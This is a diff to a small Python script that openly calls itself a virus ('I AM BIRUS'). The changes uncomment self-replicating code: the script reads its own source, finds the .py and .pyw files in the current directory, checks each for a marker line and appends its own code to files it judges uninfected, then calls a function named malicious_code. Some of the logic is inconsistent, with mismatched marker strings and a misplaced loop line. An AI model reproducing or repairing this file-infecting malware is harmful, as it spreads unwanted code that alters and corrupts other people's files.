@@ -1,6 +1,6 @@
 
 
-# I AM VIRUS !
+# I AM BIRUS !
 
 import sys
 import glob
@@ -12,76 +12,23 @@ with open(sys.argv[0], 'r') as f:
 
 self_replicating_part = False
 
-#for line in lines:
-    #if line == "# VIRUS SAYS HI, HAVE INFECTED ALL YOUR FILES!!":
-        #self_replicating_part = True
-    #if not self_replicating_part:
-        #virus_code.append(line)
-    #if line == "# VIRUS SAYS BYE!\n":
-        #break
+for line in lines:
+    if line == "# BIRUS SAYS HI, HAVE INFECTED ALL YOUR FILES!!":
+        self_replicating_part = True
+    if not self_replicating_part:
+        virus_code.append(line)
+    if line == "# BIRUS SAYS BYE!\n":
+        break
+    python_files = glob.glob('*.py') + glob.glob('*.pyw')
 
-
-#for line in lines:
-    #if line == "# VIRUS SAYS HI, HAVE INFECTED ALL YOUR FILES!!":
-        #self_replicating_part = True
-    #if not self_replicating_part:
-        #virus_code.append(line)
-    #if line == "# VIRUS SAYS BYE!\n":
-        #break
-#python_files = glob.glob('*.py') + glob.glob('*.pyw')
-
-#for line in lines:
-    #if line == "# VIRUS SAYS HI, HAVE INFECTED ALL YOUR FILES!!":
-        #self_replicating_part = True
-    #if not self_replicating_part:
-        #virus_code.append(line)
-#python_files = glob.glob('*.py') + glob.glob('*.pyw')
-
-#for line in lines:
-        #virus_code.append(line)
-    #if line == "# VIRUS SAYS BYE!\n":
-        #break
-#python_files = glob.glob('*.py') + glob.glob('*.pyw')
-
-
-
-
-#for file in python_files:
-    #with open(file, 'r') as f:
-        #file_code = f.readlines()
-    #for line in file_code:
-        #if line == "# VIRUS SAYS HI!\n":
-            #infected = True
-            #break
-
-
-#for file in python_files:
-    #with open(file, 'r') as f:
-        #file_code = f.readlines()
-    #infected = False
-        #if line == "# VIRUS SAYS HI!\n":
-            #infected = True
-            #break
-
-
-#for file in python_files:
-    #with open(file, 'r') as f:
-        #file_code = f.readlines()
-    #infected = False
-    #for line in file_code:
-        #if line == "# VIRUS SAYS HI!\n":
-            #infected = True
-            #break
-
-
-
-#for file in python_files:
-    #with open(file, 'r') as f:
-        #file_code = f.readlines()
-    #infected = False
-    #for line in file_code:
-        #if line == "# VIRUS SAYS HI!\n":
-            #break
+for file in python_files:
+    with open(file, 'r') as f:
+        file_code = f.readlines()
+        infected = False
+        for line in file_code:
+            if line == "# VIRUS SAYS HI!\n":
+                infected = True
+                break
 
     if not infected:
         final_code = []
@@ -97,4 +44,4 @@ def malicious_code():
 
 malicious_code()
 
-# VIRUS SAYS BYE!
+# BIRUS SAYS BYE
